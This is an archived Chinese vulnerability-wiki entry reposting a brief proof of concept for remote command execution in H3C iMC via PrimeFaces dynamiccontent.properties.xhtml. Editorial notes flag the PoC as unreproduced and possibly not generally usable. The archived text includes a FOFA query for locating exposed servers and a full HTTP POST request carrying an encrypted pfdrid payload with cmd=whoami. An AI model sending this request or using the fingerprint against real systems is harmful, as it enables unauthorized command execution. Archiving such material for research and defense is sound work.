---
source: "MrWQ/vulnerability-paper"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
title: "H3C IMC dynamiccontent-properties-xhtm 远程命令执行"
product: "H3C iMC PrimeFaces dynamiccontent"
record_type: "vulnerability"
document_type: "简要PoC转载"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
prerequisites: "iMC具体版本缺；请求含JSESSIONID，未说明必须登录或匿名会话；依PrimeFaces加密配置"
side_effects: "原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96%E8%BD%AF%E4%BB%B6/%E6%9D%82%E9%A1%B9/H3C%20IMC%20dynamiccontent-properties-xhtm%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.md"
archive_commit: "41940cb0038d09ca5aaddbe5bffb923e423d210f"
source_status: "recorded"
source_note: "正文标注的原文链接；链接内容及权威性未在本次重新核验"
fofa: "body=\"/imc/javax.faces.resource/images/login_help.png.jsf?ln=primefaces-imc-new-webui\""
source_url: "https://mp.weixin.qq.com/s/BP9_H3lpluqIwL5OMIJlIw"
id: "vw-5c455fef0d74866a6d89d282"
entity_id: "ve-5c455fef0d74866a6d89d282"
schema_version: "1"
previous_fofa_unverified: "body="
---

# H3C IMC dynamiccontent-properties-xhtm 远程命令执行

> 指纹字段校订（2026-10-04）：本文原归档明确标为 FOFA 的完整表达式已记入 `fofa`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

<!-- vulwiki-editorial-rebuild:system-misc -->
## 条目范围与校订

- 本文对象：H3C iMC PrimeFaces dynamiccontent
- 文献类型：简要PoC转载
- 版本、权限及部署边界：iMC具体版本缺；请求含JSESSIONID，未说明必须登录或匿名会话；依PrimeFaces加密配置
- 核验状态：仅重建文本校订；未执行文中代码、PoC 或扫描，未把截图或转载声明记为本站复现

### 具体结论与待核项

以下为原归档的逐项勘误与证据缺口；可由文本确定的问题已在下文订正，仍缺来源的事实保持待核。

1. 标题dynamiccontent-properties-xhtm与实际dynamiccontent.properties.xhtml不一致；frontmatter body=残缺而正文完整
2. 大量不透明pfdrid密文没有生成方式/键/适用版本，固定Cookie无效，回显仅截图，不能视为通用可用PoC
3. 与misc65标H3C Magic34928的IMC payload明显关联；应修复65错产品/错CVE而非将IMC归路由器
4. 无厂商公告和修复版本，PoC链接指仓库根；清理文库营销保留原作者来源

### 操作风险

原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响

技术请求、代码与实验方法按原文保留；其中的破坏性动作仅限授权、可恢复的隔离环境。缺失代码、参数或版本事实不猜补。

### 来源追溯

- 原文标注出处：<https://mp.weixin.qq.com/s/BP9_H3lpluqIwL5OMIJlIw>
- 原文参考链接（未重新核验）：<http://ksria.com/simpread/>
- 原文参考链接（未重新核验）：<https://github.com/PeiQi0/PeiQi-WIKI-POC>
- 原文参考链接（未重新核验）：<http://wiki.peiqi.tech**>
- 原文参考链接（未重新核验）：<https://github.com/PeiQi0/PeiQi-WIKI-POC**>
- 原文参考链接（未重新核验）：<https://github.com/MrWQ/vulnerability-paper>

### 归档技术正文

<meta name="referrer" content="no-referrer"/>

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/BP9_H3lpluqIwL5OMIJlIw)

![](https://mmbiz.qpic.cn/mmbiz_gif/ibicicIH182el5PaBkbJ8nfmXVfbQx819qWWENXGA38BxibTAnuZz5ujFRic5ckEltsvWaKVRqOdVO88GrKT6I0NTTQ/640?wx_fmt=gif)

**![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7f0qibYGLgIyO0zpTSeV1I6m1WibjS1ggK9xf8lYM44SK40O6uRLTOAtiaM0xYOqZicJ2oDdiaWFianIjQ/640?wx_fmt=png)**

**一****：漏洞描述🐑**

**H3C IMC dynamiccontent.properties.xhtm 存在远程命令执行，攻击者通过构造特殊的请求造成远程命令执行**

**二:  漏洞影响🐇**

**H3C IMC**

**三:  漏洞复现🐋**

```
FOFA: body="/imc/javax.faces.resource/images/login_help.png.jsf?ln=primefaces-imc-new-webui"
```

**登录页面为**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7QXdHUTJezUWSce7fReyaBZFaSxOL446w0ZKyI0BbSKKPzlOOyFtC9xbucnnGgkqqmMoQFvgMDag/640?wx_fmt=png)

**发送如下请求包**  

```
POST /imc/javax.faces.resource/dynamiccontent.properties.xhtml HTTP/1.1
Host: 
Connection: close
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="88", "Google Chrome";v="88", ";Not A Brand";v="99"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8
Cookie: oam.Flash.RENDERMAP.TOKEN=jw7ysel68; JSESSIONID=EB4E60FA4F333FF21B488E9937B4C739; currentThemeName=imc-new-webui
Content-Type: application/x-www-form-urlencoded
Content-Length: 1564

pfdrt=sc&ln=primefaces&pfdrid=uMKljPgnOTVxmOB%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVqupdmBV%2FKAe9gtw54DSQCl72JjEAsHTRvxAuJC%2B%2FIFzB8dhqyGafOLqDOqc4QwUqLOJ5KuwGRarsPnIcJJwQQ7fEGzDwgaD0Njf%2FcNrT5NsETV8ToCfDLgkzjKVoz1ghGlbYnrjgqWarDvBnuv%2BEo5hxA5sgRQcWsFs1aN0zI9h8ecWvxGVmreIAuWduuetMakDq7ccNwStDSn2W6c%2BGvDYH7pKUiyBaGv9gshhhVGunrKvtJmJf04rVOy%2BZLezLj6vK%2BpVFyKR7s8xN5Ol1tz%2FG0VTJWYtaIwJ8rcWJLtVeLnXMlEcKBqd4yAtVfQNLA5AYtNBHneYyGZKAGivVYteZzG1IiJBtuZjHlE3kaH2N2XDLcOJKfyM%2FcwqYIl9PUvfC2Xh63Wh4yCFKJZGA2W0bnzXs8jdjMQoiKZnZiqRyDqkr5PwWqW16%2FI7eog15OBl4Kco%2FVjHHu8Mzg5DOvNevzs7hejq6rdj4T4AEDVrPMQS0HaIH%2BN7wC8zMZWsCJkXkY8GDcnOjhiwhQEL0l68qrO%2BEb%2F60MLarNPqOIBhF3RWB25h3q3vyESuWGkcTjJLlYOxHVJh3VhCou7OICpx3NcTTdwaRLlw7sMIUbF%2FciVuZGssKeVT%2FgR3nyoGuEg3WdOdM5tLfIthl1ruwVeQ7FoUcFU6RhZd0TO88HRsYXfaaRyC5HiSzRNn2DpnyzBIaZ8GDmz8AtbXt57uuUPRgyhdbZjIJx%2FqFUj%2BDikXHLvbUMrMlNAqSFJpqoy%2FQywVdBmlVdx%2BvJelZEK%2BBwNF9J4p%2F1fQ8wJZL2LB9SnqxAKr5kdCs0H%2FvouGHAXJZ%2BJzx5gcCw5h6%2Fp3ZkZMnMhkPMGWYIhFyWSSQwm6zmSZh1vRKfGRYd36aiRKgf3AynLVfTvxqPzqFh8BJUZ5Mh3V9R6D%2FukinKlX99zSUlQaueU22fj2jCgzvbpYwBUpD6a6tEoModbqMSIr0r7kYpE3tWAaF0ww4INtv2zUoQCRKo5BqCZFyaXrLnj7oA6RGm7ziH6xlFrOxtRd%2BLylDFB3dcYIgZtZoaSMAV3pyNoOzHy%2B1UtHe1nL97jJUCjUEbIOUPn70hyab29iHYAf3%2B9h0aurkyJVR28jIQlF4nT0nZqpixP%2Fnc0zrGppyu8dFzMqSqhRJgIkRrETErXPQ9sl%2BzoSf6CNta5ssizanfqqCmbwcvJkAlnPCP5OJhVes7lKCMlGH%2BOwPjT2xMuT6zaTMu3UMXeTd7U8yImpSbwTLhqcbaygXt8hhGSn5Qr7UQymKkAZGNKHGBbHeBIrEdjnVphcw9L2BjmaE%2BlsjMhGqFH6XWP5GD8FeHFtuY8bz08F4Wjt5wAeUZQOI4rSTpzgssoS1vbjJGzFukA07ahU%3D&cmd=whoami
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7QXdHUTJezUWSce7fReyaBibJRf8mLCniaBpYSk327KMcxv3U8Oexmk68XSHl5opRQh7QOiaMD9vBfg/640?wx_fmt=png)

 ****四:  漏洞 POC🦉****

```
https://github.com/PeiQi0/PeiQi-WIKI-POC
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7QXdHUTJezUWSce7fReyaBn76iaGa6mniaGdgQER0HY3YpKN1L6mg7zlK4DibibLktMUibuWnR7mz9wTA/640?wx_fmt=png)

 ****五:  关于文库🦉****

 **在线文库：**

**http://wiki.peiqi.tech**

 **Github：**

**https://github.com/PeiQi0/PeiQi-WIKI-POC**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4cpD8uQPH24EjA7YPtyZEP33zgJyPgfbMpTJGFD7wyuvYbicc1ia7JT4O3r3E99JBicWJIvcL8U385Q/640?wx_fmt=png)

最后
--

> 下面就是文库的公众号啦，更新的文章都会在第一时间推送在交流群和公众号
> 
> 想要加入交流群的师傅公众号点击交流群加我拉你啦~
> 
> 别忘了 Github 下载完给个小星星⭐

公众号

**同时知识星球也开放运营啦，希望师傅们支持支持啦🐟**

**知识星球里会持续发布一些漏洞公开信息和技术文章~**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7iafXcY0OcGbVuXIcjiaBXZuHPQeSEAhRof2olkAM9ZghicpNv0p8rRbtNCZJL4t82g15Va8iahlCWeg/640?wx_fmt=png)

**由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。**

**PeiQi 文库 拥有对此文章的修改和解释权如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经作者允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。**

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
